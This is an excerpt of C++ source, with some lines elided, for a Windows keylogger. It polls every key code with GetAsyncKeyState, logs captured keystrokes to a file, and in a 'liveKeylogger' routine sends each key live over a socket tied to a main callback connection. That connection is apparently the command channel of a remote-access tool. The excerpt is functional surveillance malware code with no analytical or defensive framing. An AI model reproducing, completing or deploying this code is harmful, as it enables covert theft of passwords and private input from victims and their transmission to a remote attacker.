...
bool keylogger_running = true;
std::ostringstream keylogger_keys;
int keylogger(std::string filePath, const bool& clean) {
	
	keylogger_running = true;
	
	std::ofstream ofs;
	bool fileIsValid = (filePath == "" ? false : true);
	
	if (fileIsValid) { ofs.open(filePath, std::ofstream::out | std::ofstream::app); }
	...
	while (true) {
		for (int i = 1; i <= 251; i++) {
			...
			if (GetAsyncKeyState(i) == -32767) {
				...
				if (key == std::string("")) { continue; }
				
				keylogger_keys << key;
				if (fileIsValid) { ofs << key; }
				
				Sleep(10);
			}
		}
		
		if (fileIsValid) { ofs.flush(); }
		
		if (!keylogger_running) { break; }
	}
	
	if (fileIsValid) { ofs.close(); }
	
	return 0;
}

int liveKeylogger(SOCKET* mainCallback, std::string filePath, const bool& clean) {
	
	SOCKET clientSocket = CreateChildSocket(*mainCallback, PORT_KEYLOGGER, WSA_FLAG_OVERLAPPED);
	...
	while (true) {
		for (int i = 1; i <= 251; i++) {
			...
			if (GetAsyncKeyState(i) == -32767) {
				...
				if (fileIsValid) { ofs << key; }
				if (clientSocket != INVALID_SOCKET) { justSend(clientSocket, key, false); }
	...
	// close connection
	CloseChildSocket(*mainCallback, PORT_KEYLOGGER, clientSocket); 
